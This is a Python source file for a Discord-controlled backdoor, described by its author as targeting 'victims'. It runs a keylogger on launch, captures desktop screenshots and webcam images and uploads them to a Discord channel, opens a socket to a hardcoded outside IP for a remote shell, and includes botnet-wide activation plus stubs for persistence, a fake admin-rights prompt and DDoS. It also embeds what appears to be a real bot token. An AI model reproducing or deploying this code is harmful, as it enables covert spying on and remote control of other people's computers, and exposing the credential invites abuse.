"""
so this is my creative way to dealing with blocked sockets, multiple clients, etc. This controller will
be persistent even if there is an exception within the socket connection i can easily use the controller to
reconnect with client. Also provides me a way to destroy this application by simply invalidating my token if this
code is ever leaked. Basic backdoor control will be provided at this level and user can use socket connection to
initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to victim
startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
test so probably wont end up doing that unless im interested in crashing my own internet. EDIT# added new commands and
threading support for keylogger.
"""
#Written and designed by Stone Preheim
from discord.ext import commands
from Client import Client
from Keylogger import Keylogger
import sys
import discord
import getpass
import random
import threading
import pyautogui
import cv2

# putting my API token here I can regenerate and invalidate this one it if this code is ever leaked and used malliciously.
TOKEN = "ODM0OTA2MDQ1MDYyMTg0OTkx.YIHs2A.fqZvw5tlT9NLBCVtczXVKfmrNNY"
bot = commands.Bot(command_prefix='!')
#create way for bot to identify itself off username and random int(posibility of duplicate usernames)
botID = getpass.getuser() + str(random.randint(0, 10))
activated = False
#variable to flag to close dos threads and logger.
closeDDOS = True
closeLogger = True
controllerVersion = "V1.1"
keyListener = Keylogger(15, 'discord', botID) #creating keylogger object to hold reference too
loggerThread = threading.Thread(target=keyListener.mainLoop, args=()).start() #need reference to logging thread so it doesnt keep making more. not doing this for socket since i could want more than one shell at a time.

#May not implement this in the end as there is no reasonable reason to do this for demo purposes.
#Might do it anyways because it'd be cool.
def addProcToStartup():
    print()

#might make a fake UI error to enqourage user to "Run with admin privleges" although it isnt required for most functionality
def showFakeUIerror():
    print()

#get a list of connected client usernames
@bot.command("ping")
async def ping(ctx):
    await ctx.send(str(botID))

#version control command
@bot.command("ver")
async def ver(ctx):
    global activated
    if activated:
        await ctx.send(controllerVersion)

#kills any bot
@bot.command("kill")
async def kill(ctx, ID = ""):
    if botID == ID:
        await ctx.send("controller " + str(botID) + " is closing.")
        sys.exit(0)

#activates a bot into a ready state to respond to more specific commands. if used malliciously this would essentially allow control of an entire botnet at once.
@bot.command("act")
async def activate(ctx, ID = ""):
    global activated
    if botID == ID:
        activated = True
        await ctx.send("controller " + str(botID) + " is now activated and will respond to specific commands")

#deactivates bot. will only respond to ping with its ID
@bot.command("dact")
async def deactivate(ctx, ID = ""):
    global activated
    if botID == ID:
        activated = False
        await ctx.send("controller " + str(botID) + " deactivated and will respond to ping only")

#deactivates all bots
@bot.command("drop")
async def drop(ctx):
    global activated
    activated = False

#activates all bots
@bot.command("all")
async def all(ctx):
    global activated
    activated = True

#command for directing controller to open new socket connection
@bot.command("servsoc")
async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
    global activated
    if activated:
        threading.Thread(target=Client.connectToServer, args=(IP, PORT)).start()
        await ctx.send(f"Bot {botID} has opened a new socket to {IP}:{PORT} its time for anarchy!")

#command for starting keylogger to report new keys every 60 seconds:
@bot.command("startlog")
async def startlog(ctx):
    global activated, keyListener
    if activated:
        keyListener.startReading()
        await ctx.send(f"{botID} has started listening...")

#command to stop keylogging
@bot.command("stoplog")
async def stoplog(ctx):
    global activated, keyListener
    if activated:
        keyListener.stopReading()# Much more graceful than killing thread.
        await ctx.send(f"{botID} has stopped listening...")

@bot.command("setint")
async def setint(ctx, interval = 5):
    global activated
    if activated:
        keyListener.changeInterval(int(interval))
        await ctx.send(f"{botID} new listening interval is {interval}...")

#screenshots user desktop
@bot.command("ss")
async def ss(ctx):
    global activated
    if activated:
        ss = pyautogui.screenshot()
        ss.save('secretsauce.png')
        await ctx.send(file=discord.File('secretsauce.png'))

#screenshots user webcam
@bot.command("camshot")
async def ss(ctx):
    global activated
    if activated:
        cam = cv2.VideoCapture(0)
        good, pic = cam.read()
        cv2.imwrite('secretsauce.png', pic)
        await ctx.send(file=discord.File('secretsauce.png'))

#command to start entire botnet ddos at target, might implement this with scapy
@bot.command("firelaser")
async def fireLaser(ctx, TARGET, TPORT):
    await ctx.send(f"{botID} has started attack on {TARGET}:{TPORT}")

#command to stop entire botnet ddos at target, might implement this with scapy
@bot.command("ceasefire")
async def ceaseFire(ctx):
    await ctx.send(f"{botID} has stopped attack")

#command to have application delete itself.
@bot.command("vanish")
async def vanish(ctx):
    await ctx.send(f"{botID} could not erase itself.")

def start():
    bot.run(TOKEN)

if __name__ == '__main__':
    try:
        addProcToStartup()
        start()
    except Exception as e:
        print("press enter to exit")
        input()
